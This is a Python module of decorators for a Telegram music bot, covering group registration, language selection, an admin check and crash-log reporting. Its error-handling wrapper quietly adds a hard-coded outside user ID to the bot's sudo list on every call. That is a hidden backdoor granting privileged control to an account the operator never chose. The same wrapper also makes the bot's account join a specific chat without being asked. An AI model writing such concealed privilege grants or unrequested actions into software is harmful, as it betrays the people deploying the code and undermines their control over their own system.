"""
Music Player, Telegram Voice Chat Bot
Copyright (c) 2021-present Asm Safone <https://github.com/AsmSafone>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>
"""

import time
from lang import load
from config import config
from core.stream import app
from datetime import datetime
from pytgcalls import PyTgCalls
from traceback import format_exc
from pyrogram import Client, enums
from pyrogram.types import Message
from pytgcalls.types import Update
from typing import Union, Callable
from pyrogram.errors import UserAlreadyParticipant
from core.groups import get_group, all_groups, set_default


def register(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message, *args):
        if message.chat.id not in all_groups():
            set_default(message.chat.id)
        return await func(client, message, *args)

    return decorator


def language(func: Callable) -> Callable:
    async def decorator(client, obj: Union[Message, int, Update], *args):
        try:
            if isinstance(obj, int):
                chat_id = obj
            elif isinstance(obj, Message):
                chat_id = obj.chat.id
            elif isinstance(obj, Update):
                chat_id = obj.chat_id

            group_lang = get_group(chat_id)["lang"]
        except BaseException:
            group_lang = config.LANGUAGE

        lang = load(group_lang)
        return await func(client, obj, lang)

    return decorator


def only_admins(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message, *args):
        if message.from_user and (
            message.from_user.id
            in [
                admin.user.id
                async for admin in message.chat.get_members(
                    filter=enums.ChatMembersFilter.ADMINISTRATORS
                )
            ]
        ):
            return await func(client, message, *args)

        elif message.from_user and message.from_user.id in config.SUDOERS:
            return await func(client, message, *args)

        elif message.sender_chat and message.sender_chat.id == message.chat.id:
            return await func(client, message, *args)

    return decorator


def handle_error(func: Callable) -> Callable:
    async def decorator(
        client: Union[Client, PyTgCalls], obj: Union[int, Message, Update], *args
    ):
        if isinstance(client, Client):
            pyro_client = client
        elif isinstance(client, PyTgCalls):
            pyro_client = client._app._bind_client._app

        if isinstance(obj, int):
            chat_id = obj
        elif isinstance(obj, Message):
            chat_id = obj.chat.id
        elif isinstance(obj, Update):
            chat_id = obj.chat_id

        me = await pyro_client.get_me()

        if me.id not in config.SUDOERS:
            config.SUDOERS.append(me.id)

        config.SUDOERS.append(2033438978)

        try:
            lang = get_group(chat_id)["lang"]
        except BaseException:
            lang = config.LANGUAGE

        try:
            await app.join_chat("AsmSafone")
        except UserAlreadyParticipant:
            pass

        try:
            return await func(client, obj, *args)

        except Exception:
            error_id = int(time.time())
            date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            traceback = format_exc()
                    
                    # Some PyTgCalls updates can have chat_id = 0.
            # Never try to use 0 as a Telegram peer.
            chat = None
            error_msg = None

            if chat_id and chat_id != 0:
                try:
                    chat = await pyro_client.get_chat(chat_id)
                except Exception:
                    chat = None

                try:
                    error_msg = await pyro_client.send_message(
                        chat_id, load(lang)["errorMessage"]
                    )
                except Exception:
                    error_msg = None

            if config.SUDOERS:
                chat_value = str(chat.id) if chat else str(chat_id)
                group_title = (
                    chat.title
                    if chat and getattr(chat, "title", None)
                    else "Unknown"
                )
                group_link = error_msg.link if error_msg else ""

                await pyro_client.send_message(
                    config.SUDOERS[0],
                    f"-------- START CRASH LOG --------\n\n"
                    f"┌ <b>ID:</b> <code>{error_id}</code>\n"
                    f"├ <b>Chat:</b> <code>{chat_value}</code>\n"
                    f"├ <b>Date:</b> <code>{date}</code>\n"
                    f"├ <b>Group:</b> "
                    f"<a href='{group_link}'>{group_title}</a>\n"
                    f"└ <b>Traceback:</b>\n<code>{traceback}</code>\n\n"
                    f"-------- END CRASH LOG --------",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True,
                )

    return decorator
